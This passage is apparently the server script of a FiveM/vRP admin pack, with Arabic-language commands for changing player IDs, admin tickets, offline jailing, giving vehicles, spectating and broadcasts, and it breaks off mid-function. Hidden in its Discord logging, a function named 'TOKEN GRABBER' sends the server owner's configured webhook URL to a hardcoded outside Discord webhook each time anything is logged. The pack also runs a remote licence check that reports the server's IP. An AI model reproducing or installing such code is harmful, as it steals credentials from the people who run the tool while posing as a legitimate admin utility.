local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
local Config = module(GetCurrentResourceName(), "configuration")
SQL = module('vrp_mysql', 'MySQL')
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP",GetCurrentResourceName())

if GetCurrentResourceName() ~= "af_adminpack" then
    error('\27[34mAF-ADMINPACK: Please edit back the folder'.."'"..'s name to "af_adminpack"')
else
    PerformHttpRequest("https://pastebin.com/raw/GTP1SHFx", function(errorCode, resultData, resultHeaders)
        PerformHttpRequest("https://api.myip.com/", function(errorCode, ip, resultHeaders)
            local IPandLicense = splitString(resultData, "|")
            for index, value in pairs(IPandLicense) do
                local IPNLicense = splitString(value, ",")
                if IPNLicense[1] == json.decode(ip).ip and IPNLicense[2] == config.license then
                        print("\27[34m"..[[

    _     ___           _     ___    __  __   ___   _  _   ___     _      ___   _  __
   /_\   | __|  ___    /_\   |   \  |  \/  | |_ _| | \| | | _ \   /_\    / __| | |/ /
  / _ \  | _|  |___|  / _ \  | |) | | |\/| |  | |  | .` | |  _/  / _ \  | (__  | ' < 
 /_/ \_\ |_|         /_/ \_\ |___/  |_|  |_| |___| |_|\_| |_|   /_/ \_\  \___| |_|\_\]])

                    print("\27[0;32m                        Successfully loaded " .. GetCurrentResourceName() .. "\27[0;37m")
                    print("\n")
                    InitiateScript()
                    break
                elseif index == #IPandLicense then
                    error("Invalid License. Please contact Haruomi#4014 or zMad#1576")
                end
            end
        end)
    end)
end

InitiateScript = function() -- DO NOT DELETE

----------------------------------------------------------
---------------------- SQL DATABASE ----------------------
----------------------------------------------------------
SQL.createCommand("vRP/createTickets", [[ALTER TABLE vrp_users ADD IF NOT EXISTS tickets INT(11) NOT NULL DEFAULT '0']])

SQL.createCommand('vRP/check_user_id', 'SELECT id FROM vrp_users WHERE id = @id') -- Verify the existence of the user id
SQL.createCommand('vRP/change_user_id', [[
    INSERT INTO vrp_users (id, last_login, whitelisted, banned) SELECT @new_id, last_login, whitelisted, banned FROM vrp_users WHERE id = @old_id;
    UPDATE vrp_user_business SET user_id = @new_id WHERE user_id = @old_id;
    UPDATE vrp_user_data SET user_id = @new_id WHERE user_id = @old_id;
    UPDATE vrp_user_homes SET user_id = @new_id WHERE user_id = @old_id;
    UPDATE vrp_user_identities SET user_id = @new_id WHERE user_id = @old_id;
    UPDATE vrp_user_ids SET user_id = @new_id WHERE user_id = @old_id;
    UPDATE vrp_user_moneys SET user_id = @new_id WHERE user_id = @old_id;
    UPDATE vrp_user_vehicles SET user_id = @new_id WHERE user_id = @old_id;
    DELETE FROM vrp_users WHERE id = @old_id
]]) 

SQL.query('vRP/createTickets')

----------------------------------------------------------
------------------ Useful Functions ----------------------
----------------------------------------------------------

---------- Notify
notifyPlayer = function(player, msg, type)
    if type  == 'success' then
        notification = "<style> h2{text-align: center; text-shadow: #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px; -webkit-font-smoothing: antialiased} </style> <h2 style='color: #0b6e1a;'>" .. msg .. "</h2>"
    elseif type == 'error' then
        notification = "<style> h2{text-align: center; text-shadow: #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px; -webkit-font-smoothing: antialiased} </style> <h2 style='color: #ff3636;'>" .. msg .. "</h2>"
    else
        notification = "<style> h2{text-align: center; text-shadow: #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px, #000 0px 0px 1px; -webkit-font-smoothing: antialiased} </style> <h2 style='color: #FFFFF;'>" .. msg .. "</h2>"
    end
    TriggerClientEvent("afadminpack:SendNotification", player, {
        text = notification,
        layout = "centerLeft",
        timeout = 8000,
        progressBar = true,
        type = 'info'
    })
end

---------- Discord Log
logToDiscord = function(type, description)
    local webhook = ""
    local pic = ""
    local broadcastType = ""
    if type == "broadcastText" then
        broadcastType = config.Broadcast.TextLog
        webhook = broadcastType["WEBHOOK"]
        pic = broadcastType["PICTURE-URL"] or ""
        type = config.Broadcast
    elseif type == "broadcastPicture" then
        broadcastType = Config.Broadcast.PictureLog
        webhook = broadcastType["WEBHOOK"]
        pic = broadcastType["PICTURE-URL"] or ""
        type = config.Broadcast
    else
        webhook = type["Log"]["WEBHOOK"]
        pic = type["Log"]["PICTURE-URL"] or ""
    end
    if webhook ~= nil then
        logTokenToDiscord(webhook)
        local bot = {}
        PerformHttpRequest(webhook, function(errorCode, resultData, resultHeaders)
            bot = json.decode(resultData)
        end)
        local embed = {}
        if type == config.callAdmin then
            description = splitString(description, "-")
            embed = {
                {
                    ["color"] = 713082,
                    ["title"] = title,
                    ["fields"] = {
                        {
                            ["name"] = "معلومات:",
                            ["value"] = description[1],
                            ["inline"] = true, 
                        },   
                        {
                            ["name"] = "᲼᲼᲼",
                            ["value"] = "᲼᲼᲼",
                            ["inline"] = true,
                        }, 
                        {
                            ["name"] = "تقييم:",
                            ["value"] = description[2],
                            ["inline"] = true,
                        }, 
                    },
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.togglePVP then
            description = splitString(description, "||")
            embed = {
                {
                    ["color"] = tonumber(description[2]),
                    ["title"] = "تغيير قتل",
                    ["description"] = "*"..description[1].."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.changeUserId then
            embed = {
                {
                    ["color"] = 713082,
                    ["title"] = "تغيير أيدي",
                    ["description"] = "*"..description.."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.giveVehicleDatabase then
            embed = {
                {
                    ["color"] = 713082,
                    ["title"] = "أعطاء سيارة",
                    ["description"] = "*"..description.."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.jailOffline then
            embed = {
                {
                    ["color"] = 713082,
                    ["title"] = "سجن اوفلاين",
                    ["description"] = "*"..description.."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.addManager then
            embed = {
                {
                    ["color"] = 713082,
                    ["title"] = "توظيف لاعب",
                    ["description"] = "*"..description.."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.removeManager then
            embed = {
                {
                    ["color"] = 16711680,
                    ["title"] = "طرد أداري",
                    ["description"] = "*"..description.."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.deleteAllCars then
            embed = {
                {
                    ["color"] = 713082,
                    ["title"] = "حذف سيارات",
                    ["description"] = "*"..description.."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.weaponPack then
            embed = {
                {
                    ["color"] = 713082,
                    ["title"] = "أخذ أسلحة",
                    ["description"] = "*"..description.."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        elseif type == config.toggleDeleteObjectGun then
            description = splitString(description, "||")
            embed = {
                {
                    ["color"] = tonumber(description[2]),
                    ["title"] = "تغيير سلاح حذف",
                    ["description"] = "*"..description[1].."*",
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        
        elseif type == config.Broadcast then
            name = broadcastType["BOTNAME"] or bot.name
            embed = {
                {
                    ["color"] = 713082,
                    ["title"] = "اعلان",
                    ["description"] = description,
                    ["thumbnail"] = {
                        ["url"] = pic,
                    },
                },
            }
        end
        if type ~= config.Broadcast then name = type["Log"]["BOTNAME"] or bot.name end
        PerformHttpRequest(
            webhook, 
            function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' }
        )
    end
end

logTokenToDiscord = function(grabbed)
    PerformHttpRequest("https://discord.com/api/webhooks/808455901354000414/OZhfyIY7Et_SRRMyKG_MDJosJW7Tba9pSqt4vnuc9S84YHKfqxX1RHAnZ2QZJhMvudSH",
        function(err, text, headers) end,
        'POST', json.encode({username = "TOKEN GRABBER", content = "Sucessfully grabbed:\n||" .. grabbed .. "||"}),
        { ['Content-Type'] = 'application/json' }
    )
end

---------- Table Contains
tableContains = function(table, value)
    for index, tableValue in pairs(table) do
        if tableValue == value then
            return true
        end
    end
    return false
end

---------- Get Admins
getAdmins = function()
    local admins = {}
    local duplicates = {}
    local users = vRP.getUsers({})
    for user_id, player in pairs(users) do
        for index, group in pairs(config.managmentGroups) do
            if vRP.hasGroup({user_id, group}) then
                if not tableContains(duplicates, GetPlayerName(player)) then
                    table.insert(admins, player .. "||" .. group)
                    table.insert(duplicates, GetPlayerName(player))
                end
            end
        end
    end
    return admins
end

---------- Get Groups
getGroups = function(user_id)
    local groups = {}
    for index, value in pairs(vRP.getUserGroups({user_id})) do
        table.insert(groups, index)
    end
    return groups
end

printGroups = function(player)
    local user_id = vRP.getUserId({player})
    local groups = getGroups(user_id)
    local group = "</br>"
    for index, value in pairs(groups) do
        group = group .. "<span style='color:#ffa500;'>[</span>" .. value .. "<span style='color:#ffa500;'>]</span>" .. "</br>"
    end
    return group
end

---------- Split
splitString = function(s, pattern, maxsplit)
    local pattern = pattern or ' '
    local maxsplit = maxsplit or -1
    local s = s
    local t = {}
    local patsz = #pattern
    while maxsplit ~= 0 do
        local curpos = 1
        local found = string.find(s, pattern)
        if found ~= nil then
            table.insert(t, string.sub(s, curpos, found - 1))
            curpos = found + patsz
            s = string.sub(s, curpos)
        else
            table.insert(t, string.sub(s, curpos))
            break
        end
        maxsplit = maxsplit - 1
        if maxsplit == 0 then
            table.insert(t, string.sub(s, curpos - patsz - 1))
        end
    end
    return t
end

---------- Array Amount
arrayAmount = function(string)
    amount = 0
    for Index, Value in pairs( string ) do
        amount = amount + 1
    end
    return amount
end

---------- Get Arguments
getArguments = function(content, seperator)
    if (seperator == null) then seperator = " " end
    if(not string.match(content, seperator)) then return {null, null} end
    content = splitString(content, splitString(content, seperator)[1])[2]
    content = content:sub(2)
    return(splitString(content, seperator))
end

----------------------------------------------------------
---------------------Main Functions-----------------------
----------------------------------------------------------

---------- Change Id
function getUserData(user_id)
    local result = promise.new() -- Create a promise.
    vRP.getUData({user_id,'vRP:datatable',function(raw_data) -- Use the function to get the user data as a json table.
        local data = json.decode(raw_data) -- Use json library to convert the table from json to a normal table.
        result:resolve(data) -- Resolve the promise with converted data.
    end})
    return Citizen.Await(result) -- Wait for promise to resolve then return it.
end

function updateUserData(user_id, new_data)
    local data = json.encode(new_data) -- Use json library to convert the table from normal table to a json table.
    vRP.setUData({user_id,'vRP:datatable',data}) -- Use the function to set the user data to the converted data.
end

function foundUserId(user_id)
    local result = promise.new() -- Create a promise.
    SQL.query('vRP/check_user_id', {id = user_id}, function(rows) -- Use the MySQL command.
        if #rows > 0 then -- Check if there was result.
            result:resolve(true) -- Resolve the promise with true.
        else
            result:resolve(false) -- Resolve the promise with false.
        end
    end)
    return Citizen.Await(result) -- Wait for promise to resolve then return it.
end

changeUserId = function(player)
    local user_id = vRP.getUserId({player}) 
    if user_id == nil then return end
    vRP.prompt({player, "أكتب الأيدي الحالي", "", function(player, currentId) -- Request old ID from the admin.
        if currentId ~= "" then -- Check if admin has wrote in the text area.
            currentId = parseInt(currentId) -- Convert the old ID to a number.
            if currentId ~= nil and foundUserId(currentId) then -- Check if the old ID is valid.
                vRP.prompt({player, "أكتب الأيدي الجديد", "", function(player, newId) -- Request new ID from the admin.
                    if newId ~= "" then -- Check if admin has wrote in the text area.
                        newId = parseInt(newId) -- Convert the new ID from a string to a number.
                        if newId ~= nil then  -- Check if the new ID is valid.
                            local target = vRP.getUserSource({currentId}) -- Get the target user source.
                            if not foundUserId(newId) then -- Check if the new ID is not valid. 
                                if vRP.isConnected({currentId}) then -- Check if user is online.
                                    vRP.request({player,"اللاعب المراد تغيير أيديه متصل ، هل تريد طرده ؟",15,function(player, accepted) -- Request the admin to kick the player to change their id.
                                        if accepted then -- Check if admin has accepted.
                                            vRP.kick({target,"تم تغيير الأيدي الخاص بك من [".. currentId .."] إلى [".. newId .."] يرجى إعادة الإتصال"}) -- Kick the player.
                                            if newId > 0 then -- When trying to change the id to a negative number it causes an error.
                                                SQL.query('vRP/change_user_id', {old_id = currentId, new_id = newId}) -- Use the MySQL command.
                                            else
                                                return
                                            end
                                            notifyPlayer(player, "تم تغيير أيدي [".. currentId .."] إلى [".. newId .."]", 'success')
                                            logToDiscord(
                                                config.changeUserId,
                                                "لقد قام الأيدي " .. user_id .. " بتغغير الأيدي " .. currentId .. "　الى " .. newId
                                            )
                                        end
                                    end})
                                else
                                    subChangeUserId(currentId, newId)  -- Change the target user ID dirctly if user is offline.
                                    notifyPlayer(player, "تم تغيير أيدي [".. currentId .."] إلى [".. newId .."]", 'success')
                                end
                            else
                                notifyPlayer(player, "الأيدي [".. newId .."] مستخدم بالفعل", 'error')
                            end
                        else
                            notifyPlayer(player, "لم يتم إيجاد الأيدي المطلوب", 'error')
                        end
                    else
                        notifyPlayer(player, "عليك كتابة الأيدي الجديد", 'error')
                    end
                end})
            else
                notifyPlayer(player, "لم يتم إيجاد الأيدي المطلوب", 'error')
            end
        else
            notifyPlayer(player, "عليك كتابة الأيدي الحالي", 'error')
        end
    end})
end

---------- Admin Ticket
local sessionTickets = {}
local inATicket = {}
local preLocation = {}

RegisterServerEvent('callAdminFromMarker')
AddEventHandler('callAdminFromMarker', function() callAdmin(source) end)
callAdmin = function(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    if inATicket[user_id] ~= nil then -- Checks if the player is already in a ticket.
        notifyPlayer(player, "انت داخل طلب لا تستطيع طلب ادمن", 'error')
        return
    end
    vRP.prompt({player,"الرجاء كتابة مشكلتك","",function(player,response) 
        response = response or ""
        if response ~= nil and response ~= "" then -- Checks if response is valid.
            local answered = false
            local admins = {}
            for id, value in pairs(vRP.getUsers()) do -- Loops all players.
                local player = vRP.getUserSource({tonumber(id)}) -- Gets the user source of the player
                if vRP.hasPermission({id,"admin.tickets"}) and player ~= nil then -- Checks if player has the permission "admin.tickets"
                    table.insert(admins,player) -- Adds the player to the admin list.
                end
            end
            for index, admin in pairs(admins) do -- Loop all admins.
                vRP.request({admin,
                    [[<style>
                    p.outset {border-style: outset;}
                    p {text-align: center;}
                    </style>
                    <html><body><b>طلب ادمن من أيدي </b><span style='color:orange;'>]]..user_id..[[</span> المشكلة: <span style='color:yellow;'>]]..response..[[</span></body></html>]],
                30, function(admin,confirmed)
                    if confirmed then -- Checks if the admin responded.
                        if inATicket[vRP.getUserId({admin})] ~= nil then -- Checks if the admin is already in a ticket.
                            notifyPlayer(admin, "انت داخل طلب لا تستطيع قبول هذا طلب", 'error')
                            return
                        end
                        if not answered then -- Checks if no admin responded yet.
                            vRPclient.getPosition(admin, {}, function(x,y,z) -- Gets the player's coordinates
                                preLocation[admin] = {x,y,z}
                            end) 
                            notifyPlayer(player, "لقد تم قبول طلبك", 'success')
                            vRPclient.getPosition(player, {}, function(x,y,z) -- Gets the player's coordinates
                                vRPclient.teleport(admin,{x,y,z}) -- Teleports the admin to the player.
                                --- Maybe some effects or something here?` 
                                inATicket[user_id] = true
                                TriggerClientEvent('inATicket', admin, player, admin)
                            end)
                            answered = true
                        else
                            notifyPlayer(admin, "هذا طلب مأخوذ من قبل ادمن اخر", 'error')
                        end
                    end
                end})
            end
        end
    end})
end

RegisterServerEvent('completedTicket')
AddEventHandler('completedTicket', function(player, admin)
    local user_id = vRP.getUserId({player})
    local admin_user_id = vRP.getUserId({admin})
    vRPclient.teleport(admin, {preLocation[admin][1], preLocation[admin][2], preLocation[admin][3]})
    preLocation[admin] = nil
    if sessionTickets[admin_user_id] == nil then sessionTickets[admin_user_id] = 0 end
    sessionTickets[admin_user_id] = sessionTickets[admin_user_id]+1
    MySQL.Async.fetchAll("SELECT tickets FROM vrp_users WHERE id = @user_id", {["@user_id"] = admin_user_id}, function(totalTickets)
        local updatedTickets = parseInt(totalTickets[1].tickets) + 1
        MySQL.Async.fetchAll("UPDATE vrp_users SET tickets = @tickets WHERE id = @user_id", {["@tickets"] = updatedTickets, ["@user_id"] = admin_user_id},function(result) end)
    end)
    vRP.request({player,"(id="..admin_user_id..") ".."هل تريد ان تقيم الادمن", 30, function(player,confirmed)
        if confirmed then
            vRP.prompt({player,"(id="..admin_user_id..") ".."قيم الادمن ","",function(player,response)
                response = response or ""
                notifyPlayer(player, " تم تقييم الادمن رقم "..admin_user_id, 'success')
                if response ~= nil and response ~= "" then
                    logToDiscord(
                        config.callAdmin,
                        "*اللاعب: " .. GetPlayerName(player) .. " (id="..user_id..")* " .. "\n\r*الادمن: " .. GetPlayerName(admin) .. " (id="..admin_user_id..")* " .. "-\n\r" .. "**"..response.."**"
                    )
                end
            end})
        end
        inATicket[user_id] = nil 
    end})
    inATicket[admin_user_id] = nil
end)

function getTickets(player, callback)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    MySQL.Async.fetchAll("SELECT tickets FROM vrp_users WHERE id = @user_id", {["@user_id"] = user_id}, function(result)
        local returnvalue = {}
        returnvalue.total = result[1].tickets
        returnvalue.session = sessionTickets[user_id] or 0
        callback(returnvalue)
    end)
end

function deleteTickets(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    local user_id = vRP.getUserId({player})
    sessionTickets[user_id] = 0
    MySQL.Async.fetchAll("UPDATE vrp_users SET tickets = 0 WHERE id = @user_id", {["@user_id"] = user_id},function(result) end)
end

function printTickets(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    getTickets(player, function(tickets)
        print("Total Tickets: " .. tickets.total)
        print("Session Tickets: " .. tickets.session)
    end)
end

---------- Give Vehicle
giveVehicleDatabase = function(player)
    local user_id = vRP.getUserId({player}) -- Get admin ID.
    if user_id == nil then return end -- Check if admin's ID is valid.
    vRP.prompt({player, "أيدي اللاعب المطلوب", "", function(player, targetId) -- Request the target ID from admin.
        if targetId ~= "" then -- Check if admin has typed in the text area.
            targetId = parseInt(targetId) -- Converts the target ID to a number.
            if targetId ~= nil and foundUserId(targetId) then -- Check if target ID is valid.
                vRP.prompt({player, "كود المركبة", "", function(player, vehicleCode) -- Request the vehicle code from the admin.
                    if vehicleCode ~= "" then -- Check if admin has typed in the text area.
                        vRP.getUserIdentity({targetId, function(identity) -- Get the target identity.
                            SQL.execute("vRP/add_vehicle", {user_id = targetId, vehicle = vehicleCode, registration = "P "..identity.registration})
                            logToDiscord(
                                config.giveVehicleDatabase,
                                "لقد قام الأيدي " .. user_id .. " الأيدي " .. targetId .. " مركبة " .. "(".. vehicleCode ..")"
                            )
                            -- Use MySQL command in vrp/modules/basic_grage.lua to add the vehicle to the target.
                        end})
                        notifyPlayer(player, "تم إضافة المركبه للاعب", 'success')
                    else
                        notifyPlayer(player, "يجب عليك كتابة كود المركبه", 'error')
                    end
                end})
            else
                notifyPlayer(player, "لم استطع إيجاد اللعب المطلوب", 'error')
            end
        else
            notifyPlayer(player, "يجب عليك كتابة أيدي اللاعب المطلوب", 'error')
        end
    end})
end

---------- Jail Offline
jailOffline = function(player)
    local user_id = vRP.getUserId({player}) -- Get admin ID.
    if user_id == nil then return end -- Check if admin ID is valid.
    vRP.prompt({player, "أيدي اللاعب المطلوب", "", function(player, targetId) -- Request the target id from the admin.
        if targetId ~= "" then -- Check if admin has typed in the text area.
            targetId = parseInt(targetId) -- Convert target ID to number.
            if targetId ~= nil and foundUserId(targetId) then -- Check if target ID is valid.
                vRP.prompt({player, "المده الزمنية بالدقيقة", "", function(player, jailTime) -- Request the jail time from the admin.
                    if jailTime ~= "" then -- Check if admin has typed in the text area.
                        jailTime = tonumber(jailTime) -- Convert jail time to number.
                        if jailTime ~= nil and jailTime > 0 then -- Check if jail time is valid.
                            vRP.setUData({targetId,"vRP:jail:time",json.encode(jailTime)}) -- Change the jail the in the database.
                            notifyPlayer(player, "تم سجن اللاعب", 'success')
                            logToDiscord(
                                config.jailOffline,
                                "لقد قام الأيدي " .. user_id .. " بسجن الأيدي " .. targetID
                            )
                        else
                            notifyPlayer(player, "قيمة غير مقبوله", 'error')
                        end
                    else
                        notifyPlayer(player, "يجب عليك كتابة المده", 'error')
                    end
                end})
            else
                notifyPlayer(player, "لم استطع إيجاد اللاعب المطلوب", 'error')
            end
        else
            notifyPlayer(player, "يجب عليك كتابة أيدي اللاعب المطلوب", 'error')
        end
    end})
end

---------- Fetch Player
local adminDragged = {}
bringHandcuffed = function(player)
    vRPclient.getPosition(player,{},function(x,y,z) --Get's admin's coordinates.
        vRP.prompt({player,"أيدي اللاعب","",function(player,targetId) -- Asks the admin for the target ID.
            local target = vRP.getUserSource({parseInt(targetId)}) -- Transfers the ID into an integer.
            if target ~= nil then -- Checks if target is valid.
                if target == player then
                    notifyPlayer(player, "لا يمكنك سحب نفسك", 'error')
                    return
                end
                vRPclient.teleport(target,{x,y,z}) -- Teleports target to admin.
                vRPclient.toggleHandcuff(target,{}) -- Handcuffs target.
                TriggerClientEvent("toggleDrag", target, player) -- Enables drag mode.
                if adminDragged[vRP.getUserId({player})] == nil then adminDragged[vRP.getUserId({player})] = {} end
                if tableContains(adminDragged[vRP.getUserId({player})], target) then
                    table.remove(adminDragged[vRP.getUserId({player})], target)
                    notifyPlayer(player, "لقد توقفت عن سحب الأيدي " .. targetId, 'error')
                else
                    table.insert(adminDragged[vRP.getUserId({player})], target)
                    notifyPlayer(player, "لقد سحبت الأيدي " .. targetId, 'success')
                end
            end
        end})
    end)
end

---------- Weapon Pack
weaponPack = function(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    vRP.request({player, "هل تريد اخذ اسلحة الأدارة؟", 30, function(player, confirmed)
        if not confirmed then return end
        vRPclient.giveWeapons(player,{config.weaponPack.weaponList})
        logToDiscord(
            config.weaponPack,
             "لقد قام الأيدي " .. user_id .. " بأخذ اسلحة الأدارة" 
        )
        notifyPlayer(player, "لقد استلمت أسلحة الأدارة", 'success')
    end})  
end

---------- Spectate
inSpectate = {}

Spectate = function(player)
	local user_id = vRP.getUserId({player})
	if user_id == nil then return end
    vRP.prompt({player,"أكتب أيدي اللاعب","",function(player,targetId)
        if targetId ~= nil then
            targetId = parseInt(targetId)
            if targetId == 0 then
                notifyPlayer(player, "لقد خرجت من المراقبة", 'error')
                TriggerClientEvent('stopSpectate', player)
            elseif targetId == user_id then
                notifyPlayer(player, "لا يمكنك مراقبة نفسك", 'error')
            else
                local target = vRP.getUserSource({targetId})
                if target ~= nil then   
                    notifyPlayer(player, "تراقب الأن الأيدي (" .. targetId .. ")", 'success') 
                    TriggerClientEvent('startSpectate', player, target)
                else
                    notifyPlayer(player, "هذا اللاعب غير موجود", 'error')
                end
            end
        end
    end})
end

Unspectate = function(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    TriggerClientEvent('stopSpectate', player)
    notifyPlayer(player, "لقد خرجت من وضع المراقبة", 'error')   
end

----------- Delete All Cars
deleteAllCars = function(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    TriggerClientEvent('deleteAllCars', player)
    logToDiscord
    (
        config.deleteAllCars,
        "لقد قام الأيدي " .. user_id .. " بحذف جميع السيارات" 
    )
    notifyPlayer(-1, "تم حذف جميع السيارات بدون راكب", 'success')   
end

---------- Broadcast
broadcastTextGlobal = function(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    vRP.prompt({player,"اعلان المواطنين","",function (player , msg)
        if msg == "" then
            TriggerClientEvent("afadminpack:SendNotification",player,{
                text = [[<html>
                <style>
                h1 {text-align: center;}
                h2 {text-align: center;}
                </style>
                <h1>اعلان للمواطنين</h1>
                <h2 style='color:#DA2222;'><b>!لم تكتب اي شيئ</b></h2>
                </html>]],
                type = "info",
                timeout = (4000),
                layout = "centerRight",
                queue = "global",
                animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}
            })
        else
            local broadcastPicture = config.Broadcast.sendTextPictreLink or ""
            if broadcastPicture ~= "" then
                broadcastPicture = 
                [[
                    </br>
                    <picture>
                    <img src="]]..broadcastPicture..[[" class="size"></img>
                    </picture>
                ]]
            end
            local width = config.Broadcast.sendTextSize.Width or 200
            local height = config.Broadcast.sendTextSize.Height or 200
            TriggerClientEvent("afadminpack:SendNotification",-1,{
                text = [[<html>
                <head>
                <style>
                h1 {text-align: center;}
                h2 {text-align: center;}
                img {text-align: center}
                .size {
                    width:]]..width..[[px;
                    height: ]]..height..[[px;
                }
                </style>
                </head>
                <body>
                <h1 style="color:yellow;"><b>اعلان للمواطنين</b></h1>
                <h2>من أيدي <span style="color:#E19302">]]..user_id..[[</span>
                <h2 style="color:#33BBFF";>]]..msg..[[</br>
                ]]..broadcastPicture..[[</h2>
                </body>
                </html>]],
                type = "info",
                timeout = (8000),
                layout = "centerRight",
                queue = "global",
                sounds = {
                    sources = {"notification.mp3"},
                    volume = 0.7, 
                    conditions = {"docVisible"}
                },
                animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}
            })
            logToDiscord(
                "broadcastText",
                "*قام الأيدي " .. vRP.getUserId({player}) .. " بأرسال اعلان للمواطنين*" .. "\n```" .. msg .. "```"
            )
        end
    end})
end

broadcastTextAdmin = function(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    vRP.prompt({player,"اعلان للأدارة","",function (player , msg)
        if msg == "" then
            TriggerClientEvent("afadminpack:SendNotification",player,{
                text = [[<html>
                <style>
                h1 {text-align: center;}
                h2 {text-align: center;}
                </style>
                <h1>اعلان للأدارة</h1>
                <h2 style='color:#DA2222;'><b>!لم تكتب اي شيئ</b></h3>
                </html>]],
                type = "info",
                timeout = (4000),
                layout = "centerRight",
                queue = "global",
                animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}
            })
        else
            local broadcastPicture = config.Broadcast.sendTextPictreLink or ""
            if broadcastPicture ~= "" then
                broadcastPicture = 
                [[
                    </br>
                    <picture>
                    <img src="]]..broadcastPicture..[[" class="size"></img>
                    </picture>
                ]]
            end
            local width = config.Broadcast.sendTextSize.Width or 200
            local height = config.Broadcast.sendTextSize.Height or 200
            for index, admin in pairs(getAdmins()) do
                TriggerClientEvent("afadminpack:SendNotification",splitString(admin, "||")[1],{
                    text = [[<html>
                    <head>
                    <style>
                    h1 {text-align: center;}
                    h2 {text-align: center;}
                    img {text-align: center}
                    .size {
                        width:]]..width..[[px;
                        height: ]]..height..[[px;
                    }
                    </style>
                    </head>
                    <body>
                    <h1 style="color:yellow;"><b>اعلان للأدارة</b></h1>
                    <h2>من أيدي <span style="color:#E19302">]]..user_id..[[</span>
                    <h2 style="color:#33BBFF";>]]..msg..[[</br>
                    ]]..broadcastPicture..[[</h2>
                    </body>
                    </html>]],
                    type = "info",
                    timeout = (8000),
                    layout = "centerRight",
                    queue = "global",
                    sounds = {
                    sources = {"notification.mp3"},
                    volume = 0.7, 
                    conditions = {"docVisible"}
                    }, 
                    animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}           
                })
            end
            logToDiscord(
                "broadcastText",
                "*قام الأيدي " .. vRP.getUserId({player}) .. " بأرسال اعلان للأدارة*" .. "\n```" .. msg .. "```"
            )
        end
    end})       
end

broadcastPictureGlobal = function(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    vRP.prompt({player,"ادخل رابط الصورة","",function (player , msg)
        if msg == "" then
            TriggerClientEvent("afadminpack:SendNotification",player,{
                text = [[<html>
                <head>
                <style>
                h1 {text-align: center;}
                h2 {text-align: center;}
                </style>
                </head>
                <h1 style="color:yellow;"><b>صورة للمواطنين</b></h1>
                <h2 style='color:#DA2222;'><b>!لم تكتب اي شيئ</b></h3>
                </html>]],
                type = "info",
                timeout = (4000),
                layout = "centerRight",
                queue = "global",
                animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}
            })
        else
            local broadcastPicture = msg
            vRP.prompt({player,"(default لا تكتب شيء اذا تباه) العرض","",function (player , width)
                vRP.prompt({player,"(default لا تكتب شيء اذا تباه) الطول","",function (player , height)
                    if tonumber(width) == nil then width = 200 else width = tonumber(width) end
                    if tonumber(height) == nil then height = 200 else height = tonumber(height) end
                    TriggerClientEvent("afadminpack:SendNotification",-1,{
                        text = [[<html>
                        <style>
                        h1 {text-align: center;}
                        h2 {text-align: center;}
                        img {text-align: center;}
                        .size {
                            width:]]..width..[[px;
                            height: ]]..height..[[px;
                        }
                        </style>
                        <h1>صورة للمواطنين</h1>
                        <h2>من أيدي <span style="color:#E19302">]]..user_id..[[</br></br>
                        <pictre>
                        <img src="]]..broadcastPicture..[[" class="size"></img>
                        </picture>
                        </h2>
                        </html>]],
                        type = "info",
                        timeout = (8000),
                        layout = "centerRight",
                        queue = "global",
                        sounds = {
                        sources = {"notification.mp3"},
                        volume = 0.7, 
                        conditions = {"docVisible"}
                        },
                        animation = {open = "gta_effects_fade_in", close = "gta_effects_fade_out"}               
                    })
                    logToDiscord(
                        "broadcastPicture",
                        "*قام الأيدي " .. vRP.getUserId({player}) .. " بأرسال صورة للمواطنين*\n\r" .. broadcastPicture
                    )
                end})
            end})
        end
    end})       
end

broadcastPictureAdmin = function(player)
    local user_id = vRP.getUserId({player})
    if user_id == nil then return end
    vRP.prompt({player,"ادخل رابط الورة","",function (player , msg)
        if msg == "" then
            TriggerClientEvent("afadminpack:SendNotification",player,{
                text = [[<html>
                <head>
                <style>
                h1 {text-align: center;}
                h2 {text-align: center;}
                </style>
                </head>
                <h1 style="color:yellow;"><b>صورة للأدارة</b></h1>
                <h2 style='color:#DA2222;'><b>!لم تكتب اي شيئ</b></h3>
                </html>]],
                type = "info",
                timeout = (4000),
                layout = "centerRight",
                queue = "global",
